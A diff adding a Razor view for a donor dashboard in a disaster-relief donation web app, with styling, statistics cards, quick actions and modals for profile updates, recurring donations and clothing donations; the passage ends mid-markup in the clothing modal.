@@ -1,0 +1,1373 @@
+﻿@model Disaster_Alleviation_Web_App.Areas.Donor.Models.DashboardViewModel
+@{
+    ViewData["Title"] = "Donor Dashboard";
+}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>@ViewData["Title"] - Gift of the Givers</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+    <style>
+        /* CSS Variables for consistent theming */
+        :root {
+            --gift-green: #006747;
+            --gift-green-light: #008055;
+            --gift-gold: #D4AF37;
+            --gift-gold-light: #F4E4A6;
+            --white: #FFFFFF;
+            --light-bg: #F8F9FA;
+            --border-color: #E9ECEF;
+            --text-dark: #333333;
+            --text-muted: #6C757D;
+        }
+
+        /* Base Styles */
+        body {
+            background-color: var(--white) !important;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            padding-top: 76px; /* Space for fixed navbar */
+            color: var(--text-dark);
+        }
+
+        /* Brand Color Classes */
+        .text-gold {
+            color: var(--gift-gold) !important;
+        }
+
+        .text-gift-green {
+            color: var(--gift-green) !important;
+        }
+
+        .bg-gift-green {
+            background-color: var(--gift-green) !important;
+        }
+
+        .bg-gold {
+            background-color: var(--gift-gold) !important;
+        }
+
+        .border-gold {
+            border-color: var(--gift-gold) !important;
+        }
+
+        /* Button Styles */
+        .btn-gold {
+            background: linear-gradient(135deg, var(--gift-gold), #E5C158);
+            color: var(--gift-green);
+            border: none;
+            font-weight: 600;
+            padding: 12px 24px;
+            transition: all 0.3s ease;
+        }
+
+            .btn-gold:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 4px 12px rgba(212, 175, 55, 0.3);
+                color: var(--gift-green);
+            }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--gift-green), var(--gift-green-light));
+            border: none;
+            font-weight: 600;
+            padding: 12px 24px;
+            transition: all 0.3s ease;
+        }
+
+            .btn-success:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 4px 12px rgba(0, 103, 71, 0.3);
+            }
+
+        .btn-outline-gold {
+            border: 2px solid var(--gift-gold);
+            color: var(--gift-gold);
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+            .btn-outline-gold:hover {
+                background-color: var(--gift-gold);
+                color: var(--gift-green);
+                transform: translateY(-2px);
+            }
+
+        /* Card and Layout Styles */
+        .card {
+            border: none;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+            .card:hover {
+                transform: translateY(-4px);
+                box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+            }
+
+        .stat-card {
+            background: linear-gradient(135deg, var(--white), var(--light-bg));
+            border-left: 4px solid var(--gift-green);
+        }
+
+        .impact-card {
+            background: linear-gradient(135deg, var(--light-bg), var(--white));
+            border-top: 4px solid var(--gift-gold);
+        }
+
+        /* Navigation Styles */
+        .navbar {
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-link {
+            font-weight: 500;
+            transition: all 0.3s ease;
+            color: var(--gift-green) !important;
+        }
+
+            .nav-link:hover {
+                color: var(--gift-gold) !important;
+            }
+
+            .nav-link.active {
+                color: var(--gift-gold) !important;
+                font-weight: 600;
+            }
+
+        /* Progress Bar Styles */
+        .progress {
+            height: 8px;
+            border-radius: 10px;
+            background-color: var(--border-color);
+        }
+
+        .progress-bar {
+            border-radius: 10px;
+            background: linear-gradient(90deg, var(--gift-green), var(--gift-green-light));
+        }
+
+        /* Impact Circle Styles */
+        .impact-circle {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            background: conic-gradient(var(--gift-green) 0deg, var(--gift-green) calc(var(--rotation, 0) * 1deg), var(--border-color) calc(var(--rotation, 0) * 1deg));
+            position: relative;
+            margin: 0 auto;
+        }
+
+        .impact-circle-inner {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            background: var(--white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        /* Badge Styles */
+        .badge {
+            font-weight: 500;
+            padding: 6px 12px;
+        }
+
+        /* Footer Styles */
+        footer {
+            margin-top: 4rem;
+        }
+
+        /* Clickable cursor for buttons */
+        .btn, .nav-link {
+            cursor: pointer;
+        }
+
+        /* Modal Styles */
+        .modal-content {
+            border-radius: 12px;
+            border: none;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, var(--gift-green), var(--gift-green-light));
+            color: white;
+            border-radius: 12px 12px 0 0;
+            padding: 1.5rem;
+        }
+
+        .modal-footer {
+            border-top: 1px solid var(--border-color);
+            padding: 1.5rem;
+        }
+
+        .form-label {
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .form-control, .form-select {
+            border-radius: 8px;
+            padding: 10px 15px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+            .form-control:focus, .form-select:focus {
+                border-color: var(--gift-green);
+                box-shadow: 0 0 0 0.25rem rgba(0, 103, 71, 0.25);
+            }
+
+        /* Recurring Donations Modal Styles */
+        .recurring-option {
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+            .recurring-option:hover {
+                border-color: var(--gift-green);
+                background-color: rgba(0, 103, 71, 0.05);
+            }
+
+            .recurring-option.selected {
+                border-color: var(--gift-green);
+                background-color: rgba(0, 103, 71, 0.1);
+            }
+
+            .recurring-option input[type="radio"] {
+                margin-right: 10px;
+            }
+
+        /* Clothing Donation Styles */
+        .clothing-category {
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+            .clothing-category:hover {
+                border-color: var(--gift-gold);
+                background-color: rgba(212, 175, 55, 0.05);
+            }
+
+            .clothing-category.selected {
+                border-color: var(--gift-gold);
+                background-color: rgba(212, 175, 55, 0.1);
+            }
+
+        .donation-type-btn {
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 10px;
+        }
+
+            .donation-type-btn:hover {
+                border-color: var(--gift-green);
+                transform: translateY(-2px);
+            }
+
+            .donation-type-btn.selected {
+                border-color: var(--gift-green);
+                background-color: rgba(0, 103, 71, 0.1);
+            }
+
+        .clothing-item {
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top border-bottom border-gold">
+        <div class="container">
+            <!-- Brand Logo and Name -->
+            <a class="navbar-brand d-flex align-items-center" href="/">
+                <img src="/images/logo.png" alt="Gift Of The Givers Foundation" height="40" class="me-2">
+                <span class="fw-bold text-gift-green">Gift of the Givers</span>
+            </a>
+
+            <!-- Mobile Menu Toggle -->
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <!-- Navigation Links -->
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto align-items-center">
+
+                    <!-- Dashboard Link (Active) -->
+                    <li class="nav-item">
+                        <a class="nav-link btn-nav fw-semibold me-3 active" asp-area="Donor" asp-controller="Dashboard" asp-action="Index">
+                            <i class="bi bi-speedometer2 me-1"></i>Dashboard
+                        </a>
+                    </li>
+
+                    <!-- Donation History Link -->
+                    <li class="nav-item">
+                        <a class="nav-link btn-nav fw-semibold me-3" asp-area="Donor" asp-controller="Dashboard" asp-action="History">
+                            <i class="bi bi-clock-history me-1"></i>History
+                        </a>
+                    </li>
+
+                    <!-- Profile Management Link -->
+                    <li class="nav-item">
+                        <a class="nav-link btn-nav fw-semibold me-3" href="#" id="profileLink">
+                            <i class="bi bi-person-circle me-1"></i>Profile
+                        </a>
+                    </li>
+
+                    <!-- Logout Button -->
+                    <li class="nav-item">
+                        <form asp-area="Identity" asp-page="/Account/Login" method="post" class="d-inline">
+                            <button type="submit" class="btn btn-outline-gold rounded-pill px-3 fw-semibold btn-nav">
+                                <i class="bi bi-box-arrow-right me-1"></i>Logout
+                            </button>
+                        </form>
+                    </li>
+
+                </ul>
+            </div>
+
+        </div>
+    </nav>
+
+    <!-- Main Dashboard Content Container -->
+    <div class="container-fluid mt-4">
+
+        <!-- Welcome Section with User Greeting -->
+        <div class="row mb-4">
+            <div class="col-lg-8">
+                <!-- Personalized Welcome Message -->
+                <h1 class="fw-bold text-gift-green mb-2">
+                    Welcome Back, @Model.FullName!
+                </h1>
+                <p class="text-muted mb-3">
+                    Thank you for your continued support in making a difference through humanitarian aid
+                </p>
+                <!-- User Status and Information -->
+                <div class="d-flex flex-wrap gap-3 align-items-center">
+                    <span class="badge bg-success rounded-pill py-2 px-3 fw-semibold">
+                        <i class="bi bi-check-circle me-1"></i>Verified Donor
+                    </span>
+                    <span class="text-muted">
+                        <i class="bi bi-clock me-1"></i>Last login: @DateTime.Now.ToString("MMM dd, yyyy 'at' hh:mm tt")
+                    </span>
+                </div>
+            </div>
+            <!-- Monthly Impact Summary Card -->
+            <div class="col-lg-4 mt-3 mt-lg-0">
+                <div class="card impact-card h-100">
+                    <div class="card-body text-center p-4">
+                        <h6 class="text-gift-green fw-bold mb-3">Your Impact This Month</h6>
+                        <div class="d-flex justify-content-around align-items-center">
+                            <div>
+                                <div class="fw-bold text-gift-green fs-3">@Model.CompletedDonations</div>
+                                <small class="text-muted">Donations Made</small>
+                            </div>
+                            <div class="vr"></div>
+                            <div>
+                                <!-- null check -->
+                                <div class="fw-bold text-gold fs-3">
+                                    R @((Model.TotalDonations > 0 ? (Model.TotalDonations / 12) : 0).ToString("N0"))
+                                </div>
+                                <small class="text-muted">Monthly Average</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Dashboard Grid Layout -->
+        <div class="row g-4">
+
+            <!-- Left Column (8 units wide) -->
+            <div class="col-lg-8">
+                <!-- Statistics Cards Row -->
+                <div class="row g-3 mb-4">
+
+                    <!-- Total Donations Card -->
+                    <div class="col-xl-3 col-md-6">
+                        <div class="card stat-card h-100">
+                            <div class="card-body p-4">
+                                <div class="d-flex justify-content-between align-items-start mb-3">
+                                    <div>
+                                        <h6 class="fw-bold text-muted mb-2">Total Donations</h6>
+                                        <p class="h3 fw-bold text-gift-green mb-1">R @Model.TotalDonations.ToString("N2")</p>
+                                        <small class="text-muted">Lifetime contributions</small>
+                                    </div>
+                                    <i class="bi bi-cash-stack fs-2 text-gift-green opacity-75"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Pending Requests Card -->
+                    <div class="col-xl-3 col-md-6">
+                        <div class="card stat-card h-100">
+                            <div class="card-body p-4">
+                                <div class="d-flex justify-content-between align-items-start mb-3">
+                                    <div>
+                                        <h6 class="fw-bold text-muted mb-2">Pending Requests</h6>
+                                        <p class="h3 fw-bold text-warning mb-1">@Model.PendingRequests</p>
+                                        <small class="text-muted">Awaiting your support</small>
+                                    </div>
+                                    <i class="bi bi-clock-history fs-2 text-warning opacity-75"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Completed Donations Card -->
+                    <div class="col-xl-3 col-md-6">
+                        <div class="card stat-card h-100">
+                            <div class="card-body p-4">
+                                <div class="d-flex justify-content-between align-items-start mb-3">
+                                    <div>
+                                        <h6 class="fw-bold text-muted mb-2">Completed</h6>
+                                        <p class="h3 fw-bold text-success mb-1">@Model.CompletedDonations</p>
+                                        <small class="text-muted">Successful donations</small>
+                                    </div>
+                                    <i class="bi bi-check-circle fs-2 text-success opacity-75"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Impact Score Card -->
+                    <div class="col-xl-3 col-md-6">
+                        <div class="card stat-card h-100">
+                            <div class="card-body p-4">
+                                <div class="d-flex justify-content-between align-items-start mb-3">
+                                    <div>
+                                        <h6 class="fw-bold text-muted mb-2">Impact Score</h6>
+                                        <p class="h3 fw-bold text-gold mb-1">@(Model.CompletedDonations * 10)</p>
+                                        <small class="text-muted">Lives touched</small>
+                                    </div>
+                                    <i class="bi bi-heart-fill fs-2 text-gold opacity-75"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Actions and Recent Activity Side by Side -->
+                <div class="row g-4">
+
+                    <!-- Quick Actions Panel -->
+                    <div class="col-md-6">
+                        <div class="card h-100">
+                            <div class="card-header bg-gift-green text-white rounded-top-3 py-3">
+                                <h5 class="mb-0 fw-bold">
+                                    <i class="bi bi-lightning-charge-fill me-2"></i>Quick Actions
+                                </h5>
+                            </div>
+                            <div class="card-body p-3">
+                                <div class="row g-2">
+                                    <!-- Donation Type Selection -->
+                                    <div class="col-12 mb-3">
+                                        <div class="row g-2">
+                                            <div class="col-6">
+                                                <div class="donation-type-btn selected" data-type="monetary">
+                                                    <i class="bi bi-cash-coin fs-4 text-gift-green mb-2"></i>
+                                                    <div class="fw-bold">Monetary Donation</div>
+                                                </div>
+                                            </div>
+                                            <div class="col-6">
+                                                <div class="donation-type-btn" data-type="clothing">
+                                                    <i class="bi bi-bag-heart fs-4 text-gift-green mb-2"></i>
+                                                    <div class="fw-bold">Clothing Donation</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Primary Donation Button - Dynamic based on selection -->
+                                    <div class="col-12 mb-2" id="monetaryDonationSection">
+                                        <a href="#" class="btn btn-gold w-100 rounded-2 fw-bold py-3 d-flex align-items-center justify-content-center" id="makeDonationBtn">
+                                            <i class="bi bi-credit-card me-2 fs-5"></i>Make a Donation
+                                        </a>
+                                    </div>
+
+                                    <!-- Clothing Donation Button -->
+                                    <div class="col-12 mb-2" id="clothingDonationSection" style="display: none;">
+                                        <a href="#" class="btn btn-gold w-100 rounded-2 fw-bold py-3 d-flex align-items-center justify-content-center" id="donateClothesBtn">
+                                            <i class="bi bi-bag-heart me-2 fs-5"></i>Donate Clothes
+                                        </a>
+                                    </div>
+
+                                    <!-- Secondary Action Buttons -->
+                                    <div class="col-6 mb-2">
+                                        <a href="#" class="btn btn-outline-gold w-100 rounded-2 fw-bold py-2 d-flex align-items-center justify-content-center" id="bankingDetailsBtn">
+                                            <i class="bi bi-bank me-2"></i>Banking
+                                        </a>
+                                    </div>
+                                    <div class="col-6 mb-2">
+                                        <a href="#" class="btn btn-outline-gold w-100 rounded-2 fw-bold py-2 d-flex align-items-center justify-content-center" id="leaveLegacyBtn">
+                                            <i class="bi bi-gem me-2"></i>Leave Legacy
+                                        </a>
+                                    </div>
+                                    <!-- Recurring Donation Button -->
+                                    <div class="col-12">
+                                        <a href="#" class="btn btn-success w-100 rounded-2 fw-bold py-2 d-flex align-items-center justify-content-center" id="recurringDonationBtn">
+                                            <i class="bi bi-arrow-repeat me-2"></i>Setup Recurring Donation
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Recent Activity Panel -->
+                    <div class="col-md-6">
+                        <div class="card h-100">
+                            <div class="card-header bg-gold text-dark rounded-top-3 py-3">
+                                <h5 class="mb-0 fw-bold">
+                                    <i class="bi bi-activity me-2"></i>Recent Activity
+                                </h5>
+                            </div>
+                            <div class="card-body p-3">
+                                <!-- Recent Activity Item 1 -->
+                                <div class="d-flex align-items-start mb-3">
+                                    <div class="bg-success rounded-circle p-2 me-3 flex-shrink-0">
+                                        <i class="bi bi-check-lg text-white"></i>
+                                    </div>
+                                    <div class="flex-grow-1">
+                                        <h6 class="mb-0 fw-bold text-dark">Donation Completed</h6>
+                                        <small class="text-muted">2 hours ago • R 500.00</small>
+                                    </div>
+                                </div>
+                                <!-- Recent Activity Item 2 -->
+                                <div class="d-flex align-items-start mb-3">
+                                    <div class="bg-primary rounded-circle p-2 me-3 flex-shrink-0">
+                                        <i class="bi bi-clock text-white"></i>
+                                    </div>
+                                    <div class="flex-grow-1">
+                                        <h6 class="mb-0 fw-bold text-dark">Recurring Setup</h6>
+                                        <small class="text-muted">Yesterday • Monthly donation</small>
+                                    </div>
+                                </div>
+                                <!-- Recent Activity Item 3 -->
+                                <div class="d-flex align-items-start">
+                                    <div class="bg-info rounded-circle p-2 me-3 flex-shrink-0">
+                                        <i class="bi bi-bell text-white"></i>
+                                    </div>
+                                    <div class="flex-grow-1">
+                                        <h6 class="mb-0 fw-bold text-dark">New Campaign Alert</h6>
+                                        <small class="text-muted">3 days ago • Emergency Relief Fund</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Column (4 units wide) -->
+            <div class="col-lg-4">
+
+                <!-- Impact Meter Visualization -->
+                <div class="card mb-4">
+                    <div class="card-header bg-gift-green text-white rounded-top-3 py-3">
+                        <h5 class="mb-0 fw-bold">
+                            <i class="bi bi-graph-up me-2"></i>Your Impact Meter
+                        </h5>
+                    </div>
+                    <div class="card-body text-center p-4">
+                        <!-- Circular Progress Indicator -->
+                        <div class="impact-circle mb-3" style="--rotation: @(Math.Min(Model.CompletedDonations * 3.6, 360))">
+                            <div class="impact-circle-inner">
+                                <div class="fw-bold fs-2 text-gift-green">@Model.CompletedDonations</div>
+                                <small class="text-muted">Donations</small>
+                            </div>
+                        </div>
+                        <p class="text-muted mb-0">
+                            <!-- Dynamic encouragement message based on donation count -->
+                            @if (Model.CompletedDonations >= 10)
+                            {
+                                <text>You're in the top 10% of donors! 🌟</text>
+                            }
+                            else if (Model.CompletedDonations >= 5)
+                            {
+                                <text>You're making a significant impact! 💪</text>
+                            }
+                            else
+                            {
+                                <text>Every donation makes a difference! ✨</text>
+                            }
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Active Campaigns Panel -->
+                <div class="card">
+                    <div class="card-header bg-success text-white rounded-top-3 py-3">
+                        <h5 class="mb-0 fw-bold">
+                            <i class="bi bi-megaphone me-2"></i>Active Campaigns
+                        </h5>
+                    </div>
+                    <div class="card-body p-3">
+                        <!-- Campaign Item 1 -->
+                        <div class="campaign-item mb-3 p-3 rounded-3 bg-light">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <h6 class="fw-bold mb-0 text-gift-green">Emergency Relief Fund</h6>
+                                <span class="badge bg-danger">Urgent</span>
+                            </div>
+                            <p class="text-muted small mb-2">Support families affected by recent natural disasters</p>
+                            <div class="progress mb-2">
+                                <div class="progress-bar" style="width: 75%"></div>
+                            </div>
+                            <div class="d-flex justify-content-between small text-muted">
+                                <span>75% funded</span>
+                                <span>R 1.2M raised</span>
+                            </div>
+                        </div>
+
+                        <!-- Campaign Item 2 -->
+                        <div class="campaign-item p-3 rounded-3 bg-light">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <h6 class="fw-bold mb-0 text-gift-green">Medical Supplies Drive</h6>
+                                <span class="badge bg-warning text-dark">Ongoing</span>
+                            </div>
+                            <p class="text-muted small mb-2">Essential medical equipment for rural clinics</p>
+                            <div class="progress mb-2">
+                                <div class="progress-bar" style="width: 45%"></div>
+                            </div>
+                            <div class="d-flex justify-content-between small text-muted">
+                                <span>45% funded</span>
+                                <span>R 850K raised</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="bg-gift-green text-white mt-5 py-4">
+        <div class="container text-center">
+            <p class="mb-1 fw-bold">&copy; 2025 Gift of the Givers Foundation</p>
+            <p class="mb-0 opacity-75">Making a difference, one donation at a time</p>
+        </div>
+    </footer>
+
+    <!-- Profile Update Modal -->
+    <div class="modal fade" id="profileModal" tabindex="-1" aria-labelledby="profileModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title fw-bold" id="profileModalLabel">Update Your Profile</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body p-4">
+                    <form id="profileForm">
+                        <div class="row g-3">
+                            <div class="col-md-6">
+                                <label for="firstName" class="form-label">First Name</label>
+                                <input type="text" class="form-control" id="firstName" value="@Model.FullName.Split(' ')[0]" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="lastName" class="form-label">Last Name</label>
+                                <input type="text" class="form-control" id="lastName" value="@(Model.FullName.Split(' ').Length > 1 ? Model.FullName.Split(' ')[1] : "")" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="email" class="form-label">Email Address</label>
+                                <input type="email" class="form-control" id="email" value="user@example.com" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="phone" class="form-label">Phone Number</label>
+                                <input type="tel" class="form-control" id="phone" value="+27 12 345 6789">
+                            </div>
+                            <div class="col-12">
+                                <label for="address" class="form-label">Address</label>
+                                <input type="text" class="form-control" id="address" value="123 Main Street, Johannesburg">
+                            </div>
+                            <div class="col-md-6">
+                                <label for="city" class="form-label">City</label>
+                                <input type="text" class="form-control" id="city" value="Johannesburg">
+                            </div>
+                            <div class="col-md-6">
+                                <label for="postalCode" class="form-label">Postal Code</label>
+                                <input type="text" class="form-control" id="postalCode" value="2000">
+                            </div>
+                            <div class="col-12">
+                                <label for="preferences" class="form-label">Communication Preferences</label>
+                                <select class="form-select" id="preferences">
+                                    <option value="email">Email Only</option>
+                                    <option value="sms">SMS Only</option>
+                                    <option value="both" selected>Email and SMS</option>
+                                </select>
+                            </div>
+                            <div class="col-12">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="newsletter" checked>
+                                    <label class="form-check-label" for="newsletter">
+                                        Subscribe to our newsletter for updates on campaigns and impact stories
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-success" id="saveProfileBtn">Save Changes</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Recurring Donations Modal -->
+    <div class="modal fade" id="recurringModal" tabindex="-1" aria-labelledby="recurringModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title fw-bold" id="recurringModalLabel">Setup Recurring Donation</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body p-4">
+                    <form id="recurringForm">
+                        <div class="row g-4">
+                            <div class="col-12">
+                                <h6 class="fw-bold text-gift-green mb-3">Select Donation Amount</h6>
+                                <div class="row g-2">
+                                    <div class="col-4">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="amount" id="amount50" value="50">
+                                            <label class="form-check-label fw-bold" for="amount50">
+                                                R 50
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <div class="col-4">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="amount" id="amount100" value="100" checked>
+                                            <label class="form-check-label fw-bold" for="amount100">
+                                                R 100
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <div class="col-4">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="amount" id="amount250" value="250">
+                                            <label class="form-check-label fw-bold" for="amount250">
+                                                R 250
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <div class="col-4">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="amount" id="amount500" value="500">
+                                            <label class="form-check-label fw-bold" for="amount500">
+                                                R 500
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <div class="col-4">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="amount" id="amount1000" value="1000">
+                                            <label class="form-check-label fw-bold" for="amount1000">
+                                                R 1000
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <div class="col-4">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="amount" id="amountCustom" value="custom">
+                                            <label class="form-check-label fw-bold" for="amountCustom">
+                                                Custom
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="mt-3" id="customAmountContainer" style="display: none;">
+                                    <label for="customAmount" class="form-label">Custom Amount (R)</label>
+                                    <input type="number" class="form-control" id="customAmount" min="10" step="10">
+                                </div>
+                            </div>
+
+                            <div class="col-12">
+                                <h6 class="fw-bold text-gift-green mb-3">Select Frequency</h6>
+                                <div class="row g-3">
+                                    <div class="col-md-4">
+                                        <div class="recurring-option" data-frequency="monthly">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="radio" name="frequency" id="frequencyMonthly" value="monthly" checked>
+                                                <label class="form-check-label fw-bold" for="frequencyMonthly">
+                                                    Monthly
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Deducted on the 1st of each month</small>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <div class="recurring-option" data-frequency="quarterly">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="radio" name="frequency" id="frequencyQuarterly" value="quarterly">
+                                                <label class="form-check-label fw-bold" for="frequencyQuarterly">
+                                                    Quarterly
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Every 3 months</small>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <div class="recurring-option" data-frequency="annually">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="radio" name="frequency" id="frequencyAnnually" value="annually">
+                                                <label class="form-check-label fw-bold" for="frequencyAnnually">
+                                                    Annually
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Once a year</small>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-12">
+                                <h6 class="fw-bold text-gift-green mb-3">Select Campaign</h6>
+                                <select class="form-select" id="campaignSelect">
+                                    <option value="general" selected>General Relief Fund (Most Needed)</option>
+                                    <option value="emergency">Emergency Relief Fund</option>
+                                    <option value="medical">Medical Supplies Drive</option>
+                                    <option value="education">Education Support Program</option>
+                                    <option value="water">Clean Water Initiative</option>
+                                </select>
+                            </div>
+
+                            <div class="col-12">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="termsAgreement" required>
+                                    <label class="form-check-label" for="termsAgreement">
+                                        I agree to the recurring donation terms and authorize Gift of the Givers to deduct the specified amount according to the selected frequency until I cancel this arrangement.
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-success" id="confirmRecurringBtn">Confirm Recurring Donation</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Clothing Donation Modal -->
+    <div class="modal fade" id="clothingModal" tabindex="-1" aria-labelledby="clothingModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title fw-bold" id="clothingModalLabel">Donate Clothes</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body p-4">
+                    <form id="clothingForm">
+                        <div class="row g-4">
+                            <div class="col-12">
+                                <h6 class="fw-bold text-gift-green mb-3">Select Clothing Categories</h6>
+                                <div class="row g-3">
+                                    <div class="col-md-6">
+                                        <div class="clothing-category" data-category="mens">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="checkbox" id="categoryMens" value="mens">
+                                                <label class="form-check-label fw-bold" for="categoryMens">
+                                                    Men's Clothing
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Shirts, pants, jackets, etc.</small>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="clothing-category" data-category="womens">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="checkbox" id="categoryWomens" value="womens">
+                                                <label class="form-check-label fw-bold" for="categoryWomens">
+                                                    Women's Clothing
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Dresses, blouses, skirts, etc.</small>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="clothing-category" data-category="childrens">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="checkbox" id="categoryChildrens" value="childrens">
+                                                <label class="form-check-label fw-bold" for="categoryChildrens">
+                                                    Children's Clothing
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Ages 0-12 years</small>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="clothing-category" data-category="babies">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="checkbox" id="categoryBabies" value="babies">
+                                                <label class="form-check-label fw-bold" for="categoryBabies">
+                                                    Baby Clothing
+                                                </label>
+                                            </div>
+                                            <small class="text-muted">Newborn to 24 months</small>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-12">
+                                <h6 class="fw-bold text-gift-green mb-3">Clothing Details</h6>
+                                <div id="clothingItemsContainer">
+                                    <!-- Dynamic clothing items will be added here -->
+                                </div>
+                                <button type="button" class="btn btn-outline-gold w-100 mt-2" id="addMoreClothesBtn">
